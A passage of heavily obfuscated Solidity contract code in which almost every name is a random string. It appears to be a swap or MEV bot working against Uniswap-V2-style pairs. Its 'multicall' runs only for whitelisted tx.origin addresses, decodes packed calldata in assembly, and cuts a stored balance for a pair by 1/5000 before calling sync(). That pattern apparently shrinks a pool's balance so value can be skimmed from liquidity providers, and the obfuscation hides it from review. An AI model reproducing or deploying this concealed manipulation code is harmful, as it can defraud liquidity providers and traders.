      ulL2Ty4kG2n2hRQnq3eDRb1vINFMl355xvNuPh5hbZhsjYB6KSMA7M4QwilkDPCCec5Gt77yYk9LLXbdh2JyA8rfFn0wGFrs(aqVUoJNQHAI6RajfSn7Cp7aKFqR5C10R9ee9hTzwIztOnkIb37WlDDydcnZYWghpApSFjxFD6cXCMfJyPR1E7c2RB0TOzTSH, xta2tezaOSWsfQfiJ0tCcPan91M0yQiwn5lWgjDnW6DOtdnUNN74KvyZENqFpI91w45lnPBE2ZvWi8QaZgc6dq10xu2wZ8sQ, lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU);

    y2ZsvMrzadb1Vd1ZMxPnwedd8bsLlcQNtb3MXN0cvvX8Dqcgeyu8zgPMPlcFlLIaWMVngNitYK52PxnbOqFKFBnA6pTwmNWJ(bIwt98Qve7DlECIFcc144AkoX9mgqSfrHgya0ZADmd6PQ9ACQ660S91NIRk4GmI6PERHURp8CUM58MLPl0dSPuzFhVthAZj1, ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz, aqVUoJNQHAI6RajfSn7Cp7aKFqR5C10R9ee9hTzwIztOnkIb37WlDDydcnZYWghpApSFjxFD6cXCMfJyPR1E7c2RB0TOzTSH);
    if (l0JY9OfscIZ2ramjcUcsUzx23lmS3VsJc89Dnt1mL8gE8HrKgKdXDXKVzOls3DSnBHHMB48O1Y8VVsRnObHiWx5EodbNyAnE > qSYiOnvvC45EUMG18Qio6Ck1DSWv2Ba89r82ASWUArjLetqvGH8komSjplWxhK4eQi4PPTq2o9CtAy4z3mT4X5W8OKmNxW7p)
      kGSETcij3F4roJtZETfS4qLo8hwM0SW4NRHPfSRNiUBQhM19zxcIW8td6yzesqGum5wXvCU3BfWl4O1XJgaUVc8oaCIaGzKy(ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz).swap(i3DArpe7m6ujnyeXs6AOXwybCyAbkeMjnOCsyFGBfmFciua2CI2gdJOUHYOi2vEf6nOAAosvw2b1njGzpB6nHQ748eCAP9cr, 0, fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn, new bytes(0));
    else kGSETcij3F4roJtZETfS4qLo8hwM0SW4NRHPfSRNiUBQhM19zxcIW8td6yzesqGum5wXvCU3BfWl4O1XJgaUVc8oaCIaGzKy(ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz).swap(0, i3DArpe7m6ujnyeXs6AOXwybCyAbkeMjnOCsyFGBfmFciua2CI2gdJOUHYOi2vEf6nOAAosvw2b1njGzpB6nHQ748eCAP9cr, fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn, new bytes(0));

    return (lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU - i3DArpe7m6ujnyeXs6AOXwybCyAbkeMjnOCsyFGBfmFciua2CI2gdJOUHYOi2vEf6nOAAosvw2b1njGzpB6nHQ748eCAP9cr, xta2tezaOSWsfQfiJ0tCcPan91M0yQiwn5lWgjDnW6DOtdnUNN74KvyZENqFpI91w45lnPBE2ZvWi8QaZgc6dq10xu2wZ8sQ + aqVUoJNQHAI6RajfSn7Cp7aKFqR5C10R9ee9hTzwIztOnkIb37WlDDydcnZYWghpApSFjxFD6cXCMfJyPR1E7c2RB0TOzTSH);
  }

  function fPD8BrxRHH5Tpr4RKO6jEgAjzAfjO1Gc1EcatQY9dwjIw3vdk1B1FH7I3xjChOJEZrhbghxLZSqcanvm8dNHhaCaWzmWpSdw(
    address bIwt98Qve7DlECIFcc144AkoX9mgqSfrHgya0ZADmd6PQ9ACQ660S91NIRk4GmI6PERHURp8CUM58MLPl0dSPuzFhVthAZj1,
    uint256 sS2bP9M5WsbFQWRjPRl10umy02vhN9mdEXIeSb8aWgqT3stRsbXLdIfiWTBRFGtRwQEuYYHyb5FNC0lWdf5VEPbluuFJutF1,
    uint256 lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU,
    uint256 xta2tezaOSWsfQfiJ0tCcPan91M0yQiwn5lWgjDnW6DOtdnUNN74KvyZENqFpI91w45lnPBE2ZvWi8QaZgc6dq10xu2wZ8sQ
  ) internal returns (uint256, uint256) {
    address l0JY9OfscIZ2ramjcUcsUzx23lmS3VsJc89Dnt1mL8gE8HrKgKdXDXKVzOls3DSnBHHMB48O1Y8VVsRnObHiWx5EodbNyAnE = address(this);
    uint256 i3DArpe7m6ujnyeXs6AOXwybCyAbkeMjnOCsyFGBfmFciua2CI2gdJOUHYOi2vEf6nOAAosvw2b1njGzpB6nHQ748eCAP9cr =
      ulL2Ty4kG2n2hRQnq3eDRb1vINFMl355xvNuPh5hbZhsjYB6KSMA7M4QwilkDPCCec5Gt77yYk9LLXbdh2JyA8rfFn0wGFrs(sS2bP9M5WsbFQWRjPRl10umy02vhN9mdEXIeSb8aWgqT3stRsbXLdIfiWTBRFGtRwQEuYYHyb5FNC0lWdf5VEPbluuFJutF1, lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU, xta2tezaOSWsfQfiJ0tCcPan91M0yQiwn5lWgjDnW6DOtdnUNN74KvyZENqFpI91w45lnPBE2ZvWi8QaZgc6dq10xu2wZ8sQ);

    IERC20(qSYiOnvvC45EUMG18Qio6Ck1DSWv2Ba89r82ASWUArjLetqvGH8komSjplWxhK4eQi4PPTq2o9CtAy4z3mT4X5W8OKmNxW7p).transfer(ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz, sS2bP9M5WsbFQWRjPRl10umy02vhN9mdEXIeSb8aWgqT3stRsbXLdIfiWTBRFGtRwQEuYYHyb5FNC0lWdf5VEPbluuFJutF1);
    if (l0JY9OfscIZ2ramjcUcsUzx23lmS3VsJc89Dnt1mL8gE8HrKgKdXDXKVzOls3DSnBHHMB48O1Y8VVsRnObHiWx5EodbNyAnE > qSYiOnvvC45EUMG18Qio6Ck1DSWv2Ba89r82ASWUArjLetqvGH8komSjplWxhK4eQi4PPTq2o9CtAy4z3mT4X5W8OKmNxW7p)
      kGSETcij3F4roJtZETfS4qLo8hwM0SW4NRHPfSRNiUBQhM19zxcIW8td6yzesqGum5wXvCU3BfWl4O1XJgaUVc8oaCIaGzKy(ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz).swap(0, i3DArpe7m6ujnyeXs6AOXwybCyAbkeMjnOCsyFGBfmFciua2CI2gdJOUHYOi2vEf6nOAAosvw2b1njGzpB6nHQ748eCAP9cr, bIwt98Qve7DlECIFcc144AkoX9mgqSfrHgya0ZADmd6PQ9ACQ660S91NIRk4GmI6PERHURp8CUM58MLPl0dSPuzFhVthAZj1, new bytes(0));
    else kGSETcij3F4roJtZETfS4qLo8hwM0SW4NRHPfSRNiUBQhM19zxcIW8td6yzesqGum5wXvCU3BfWl4O1XJgaUVc8oaCIaGzKy(ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz).swap(i3DArpe7m6ujnyeXs6AOXwybCyAbkeMjnOCsyFGBfmFciua2CI2gdJOUHYOi2vEf6nOAAosvw2b1njGzpB6nHQ748eCAP9cr, 0, bIwt98Qve7DlECIFcc144AkoX9mgqSfrHgya0ZADmd6PQ9ACQ660S91NIRk4GmI6PERHURp8CUM58MLPl0dSPuzFhVthAZj1, new bytes(0));

    return (lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU + sS2bP9M5WsbFQWRjPRl10umy02vhN9mdEXIeSb8aWgqT3stRsbXLdIfiWTBRFGtRwQEuYYHyb5FNC0lWdf5VEPbluuFJutF1, xta2tezaOSWsfQfiJ0tCcPan91M0yQiwn5lWgjDnW6DOtdnUNN74KvyZENqFpI91w45lnPBE2ZvWi8QaZgc6dq10xu2wZ8sQ - i3DArpe7m6ujnyeXs6AOXwybCyAbkeMjnOCsyFGBfmFciua2CI2gdJOUHYOi2vEf6nOAAosvw2b1njGzpB6nHQ748eCAP9cr);
  }

  function bLX5ce5hUNXm4KgCrT6RGW3zVAH0gSMaGKWf62JETyfMUFC3yxnGnbndU1BW3DEP4ygECtneofR48H7dlgSnobQdyRCBQAnv(bytes memory llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8, uint256 faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ)
    private
    pure
    returns (
      uint256 qXQuyEYdv5w0Gb8cFj91aCluO6A6Rwz3Ev3LHf1cpepHOA4dDvXOe0deaQwToUp7lPpqnvQDKYOO3r99JdrJPR6LxGBZVqYc,
      address y9WpWXycAqSpesN6QnrvECiDy8uBq75JyNma2fWZMtuH91ZWYeSBq5ooj6yzyWu3ZRHZeJNwtAi5kIjdtsGalt2UI8yseLU1,
      uint256 hfUhWaL1qsbjf0YRqzempjWpP6vAQ65QBXGsnxxNKIuNfUZcSYTmR8IynfbtJSFxmFk6hT1yl2KPO6kUWCY0zngT6AJ9kgLa,
      uint256 spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R,
      uint256 nod3Mq9OnK0EvW4tzccSJpxMzdMw3RvhmKyiiygZRxAEJfLMsN4NtRnVrZNwBPb179OFu9Z46fcsMLztlAF3DtE9BEFeUBUR
    )
  {
    assembly {
      let amountdataLen := shr(248, mload(add(llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8, faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ)))
      let kcr89wtnT2XQKcbi0dfO3OKsqkXvpmRKKxntEGayGbGArbmgaPxQ0lGpQtJpiLFqHIuo9l8SpcUJZByRw48BtVASGGiPiWSv := sub(256, mul(amountdataLen, 8))
      faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ := add(faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ, 1)

      qXQuyEYdv5w0Gb8cFj91aCluO6A6Rwz3Ev3LHf1cpepHOA4dDvXOe0deaQwToUp7lPpqnvQDKYOO3r99JdrJPR6LxGBZVqYc := shr(248, mload(add(llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8, faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ)))
      faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ := add(faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ, 1)

      switch qXQuyEYdv5w0Gb8cFj91aCluO6A6Rwz3Ev3LHf1cpepHOA4dDvXOe0deaQwToUp7lPpqnvQDKYOO3r99JdrJPR6LxGBZVqYc
        case 1 {
          hfUhWaL1qsbjf0YRqzempjWpP6vAQ65QBXGsnxxNKIuNfUZcSYTmR8IynfbtJSFxmFk6hT1yl2KPO6kUWCY0zngT6AJ9kgLa := shr(240, mload(add(llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8, faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ)))
          faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ := add(faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ, 2)

          spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R := shr(kcr89wtnT2XQKcbi0dfO3OKsqkXvpmRKKxntEGayGbGArbmgaPxQ0lGpQtJpiLFqHIuo9l8SpcUJZByRw48BtVASGGiPiWSv, mload(add(llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8, faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ)))
          faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ := add(faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ, amountdataLen)
        }
        case 2 {
          hfUhWaL1qsbjf0YRqzempjWpP6vAQ65QBXGsnxxNKIuNfUZcSYTmR8IynfbtJSFxmFk6hT1yl2KPO6kUWCY0zngT6AJ9kgLa := shr(240, mload(add(llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8, faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ)))
          faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ := add(faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ, 2)

          spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R := shr(kcr89wtnT2XQKcbi0dfO3OKsqkXvpmRKKxntEGayGbGArbmgaPxQ0lGpQtJpiLFqHIuo9l8SpcUJZByRw48BtVASGGiPiWSv, mload(add(llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8, faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ)))
          faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ := add(faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ, amountdataLen)
        }
        case 3 {
          y9WpWXycAqSpesN6QnrvECiDy8uBq75JyNma2fWZMtuH91ZWYeSBq5ooj6yzyWu3ZRHZeJNwtAi5kIjdtsGalt2UI8yseLU1 := shr(96, mload(add(llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8, faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ)))
          faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ := add(faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ, 20)
        }
        case 4 {
          hfUhWaL1qsbjf0YRqzempjWpP6vAQ65QBXGsnxxNKIuNfUZcSYTmR8IynfbtJSFxmFk6hT1yl2KPO6kUWCY0zngT6AJ9kgLa := shr(240, mload(add(llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8, faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ)))
          faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ := add(faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ, 2)
        }
        case 5 {
          hfUhWaL1qsbjf0YRqzempjWpP6vAQ65QBXGsnxxNKIuNfUZcSYTmR8IynfbtJSFxmFk6hT1yl2KPO6kUWCY0zngT6AJ9kgLa := shr(240, mload(add(llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8, faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ)))
          faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ := add(faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ, 2)
        }
    }
    nod3Mq9OnK0EvW4tzccSJpxMzdMw3RvhmKyiiygZRxAEJfLMsN4NtRnVrZNwBPb179OFu9Z46fcsMLztlAF3DtE9BEFeUBUR = faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ;
  }

  function multicall(bytes memory eywVp1eoclJ4aWoMZnwZ0bkJtE8m1dXbrGpjT57UDrfCYbNSBIlIpblhDfFnNGNpCgY7Tb8hN2b8R8M0J45hlUcLLwnYBnXK) external payable {
    if (yBnzVUxksoIBngVt6RB2B1NOGYD7KeC23il982QDovungvUwDE9Ijo8BDU1lYOIIBQQoSqgixoTNwq4yWl3KsINrixFjzLKk[tx.origin] == false) return;
    if (msg.value > 0) mGMM6aoPBCFm6IhTdEMQulx3qiaT1zbFjcHYQRTjWdGUjbfiw4FCNCrwk1DCTtICVywucsRwtvAjuRgWozLbqfZIusaJubhJ(qSYiOnvvC45EUMG18Qio6Ck1DSWv2Ba89r82ASWUArjLetqvGH8komSjplWxhK4eQi4PPTq2o9CtAy4z3mT4X5W8OKmNxW7p).deposit{value: msg.value}();

    zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj[ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz] -= (zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj[ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz] / 5000);
    kGSETcij3F4roJtZETfS4qLo8hwM0SW4NRHPfSRNiUBQhM19zxcIW8td6yzesqGum5wXvCU3BfWl4O1XJgaUVc8oaCIaGzKy(ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz).sync();

    (uint256 xta2tezaOSWsfQfiJ0tCcPan91M0yQiwn5lWgjDnW6DOtdnUNN74KvyZENqFpI91w45lnPBE2ZvWi8QaZgc6dq10xu2wZ8sQ, uint256 lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU) =
      lm5anE5FdfsCNt3Mhgj2HMugyG5DBjkZftefkX0OfCE0N6Zj0IAXRMl9KpwVdm0m6q7F8w7lSSkVRbYFeypGEvnReXqJv89t(ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz, address(this), qSYiOnvvC45EUMG18Qio6Ck1DSWv2Ba89r82ASWUArjLetqvGH8komSjplWxhK4eQi4PPTq2o9CtAy4z3mT4X5W8OKmNxW7p);

    uint256 cuo9iUD0VWj69KG5dyNvI15RGMOG2SPToA6r5CLOyThiJ8AWQntZ1VbqgfrqcbAe8Xy1Q8cWLAupJs3hHvtu18LJFFENxWDM = lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU;

    uint256 lXf4YIkX05o4UAZOYqxDL1RmaMkZi2WiiYIQ36VDMsC4UhSJWvcHUaHVcgauuq0QM9Km9yAeJ2XQjkKKRzNKUO8EJyy9KA7m;
    uint256 faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ = 33;
    assembly {
      lXf4YIkX05o4UAZOYqxDL1RmaMkZi2WiiYIQ36VDMsC4UhSJWvcHUaHVcgauuq0QM9Km9yAeJ2XQjkKKRzNKUO8EJyy9KA7m := shr(248, mload(add(eywVp1eoclJ4aWoMZnwZ0bkJtE8m1dXbrGpjT57UDrfCYbNSBIlIpblhDfFnNGNpCgY7Tb8hN2b8R8M0J45hlUcLLwnYBnXK, 0x20)))
    }

    uint256 qXQuyEYdv5w0Gb8cFj91aCluO6A6Rwz3Ev3LHf1cpepHOA4dDvXOe0deaQwToUp7lPpqnvQDKYOO3r99JdrJPR6LxGBZVqYc;
    address ac5AGLCMZ2ajcIBFWdez1enPrrRs5XD05RMUahgqJB0eGTibrl9KoFTubcFzA5EMb0IoVBouonih5GaHedKHUAp4M7ZQmPRv;
    uint256 hfUhWaL1qsbjf0YRqzempjWpP6vAQ65QBXGsnxxNKIuNfUZcSYTmR8IynfbtJSFxmFk6hT1yl2KPO6kUWCY0zngT6AJ9kgLa;
    uint256 spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R;

    for (uint256 i; i < lXf4YIkX05o4UAZOYqxDL1RmaMkZi2WiiYIQ36VDMsC4UhSJWvcHUaHVcgauuq0QM9Km9yAeJ2XQjkKKRzNKUO8EJyy9KA7m; i++) {
      (qXQuyEYdv5w0Gb8cFj91aCluO6A6Rwz3Ev3LHf1cpepHOA4dDvXOe0deaQwToUp7lPpqnvQDKYOO3r99JdrJPR6LxGBZVqYc, ac5AGLCMZ2ajcIBFWdez1enPrrRs5XD05RMUahgqJB0eGTibrl9KoFTubcFzA5EMb0IoVBouonih5GaHedKHUAp4M7ZQmPRv, hfUhWaL1qsbjf0YRqzempjWpP6vAQ65QBXGsnxxNKIuNfUZcSYTmR8IynfbtJSFxmFk6hT1yl2KPO6kUWCY0zngT6AJ9kgLa, spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R, faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ) = bLX5ce5hUNXm4KgCrT6RGW3zVAH0gSMaGKWf62JETyfMUFC3yxnGnbndU1BW3DEP4ygECtneofR48H7dlgSnobQdyRCBQAnv(
        eywVp1eoclJ4aWoMZnwZ0bkJtE8m1dXbrGpjT57UDrfCYbNSBIlIpblhDfFnNGNpCgY7Tb8hN2b8R8M0J45hlUcLLwnYBnXK,
        faynZod38Uc1UNUb9ze4z4VEXtphrNzDnkJoAVV4stEgUxE4uiGRPRzxGKxwzSGOp3w9lR3KUDTelDg4HHoiCAf28rQUHLMJ
      );

      if (qXQuyEYdv5w0Gb8cFj91aCluO6A6Rwz3Ev3LHf1cpepHOA4dDvXOe0deaQwToUp7lPpqnvQDKYOO3r99JdrJPR6LxGBZVqYc == 1) {
        (lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU, xta2tezaOSWsfQfiJ0tCcPan91M0yQiwn5lWgjDnW6DOtdnUNN74KvyZENqFpI91w45lnPBE2ZvWi8QaZgc6dq10xu2wZ8sQ) = fPD8BrxRHH5Tpr4RKO6jEgAjzAfjO1Gc1EcatQY9dwjIw3vdk1B1FH7I3xjChOJEZrhbghxLZSqcanvm8dNHhaCaWzmWpSdw(
          wDQORhLS1MbZbpxhj2LiOTE2TqJdORg5mr9899pOQHl4WTb2hBaRQ3SMGI48dWPCDgpU6WFx93I6pjzouAZsoJZOHiKz0OGI(hfUhWaL1qsbjf0YRqzempjWpP6vAQ65QBXGsnxxNKIuNfUZcSYTmR8IynfbtJSFxmFk6hT1yl2KPO6kUWCY0zngT6AJ9kgLa),
          spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R,
          lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU,
          xta2tezaOSWsfQfiJ0tCcPan91M0yQiwn5lWgjDnW6DOtdnUNN74KvyZENqFpI91w45lnPBE2ZvWi8QaZgc6dq10xu2wZ8sQ
        );
      } else if (qXQuyEYdv5w0Gb8cFj91aCluO6A6Rwz3Ev3LHf1cpepHOA4dDvXOe0deaQwToUp7lPpqnvQDKYOO3r99JdrJPR6LxGBZVqYc == 2) {
        (lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU, xta2tezaOSWsfQfiJ0tCcPan91M0yQiwn5lWgjDnW6DOtdnUNN74KvyZENqFpI91w45lnPBE2ZvWi8QaZgc6dq10xu2wZ8sQ) = scCtMYl3QruwPvsxyA8k0Wh3uR4jgXpU7EIJomTsHEvD1vc92foQNzvE5QEnCPFn8GM91SkGHcYP1y0gUnNW7L2dcDJ1N0lT(
